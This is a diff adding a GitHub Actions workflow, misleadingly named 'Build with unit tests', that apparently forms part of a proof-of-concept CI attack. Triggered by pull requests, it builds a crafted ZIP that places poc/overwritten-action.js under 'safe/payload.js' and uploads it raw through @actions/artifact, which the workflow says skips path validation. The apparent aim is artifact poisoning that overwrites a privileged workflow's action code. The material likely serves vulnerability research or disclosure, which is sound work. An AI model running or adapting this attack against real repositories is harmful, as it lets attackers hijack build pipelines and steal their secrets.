@@ -1,0 +1,23 @@
+name: Build with unit tests
+
+on:
+  pull_request:
+
+permissions:
+  contents: read
+
+jobs:
+  upload:
+    runs-on: ubuntu-latest
+    steps:
+      - uses: actions/checkout@v4
+      - name: Build raw control artifact
+        run: |
+          python3 poc/make-artifact.py \
+            /tmp/pwnreq-artifact.zip \
+            'safe/payload.js' \
+            poc/overwritten-action.js
+      - name: Install artifact protocol client
+        run: npm install --no-save @actions/artifact@2.3.2
+      - name: Upload raw ZIP without upload-artifact path validation
+        run: node poc/upload-raw-artifact.js pwnreq-raw /tmp/pwnreq-artifact.zip
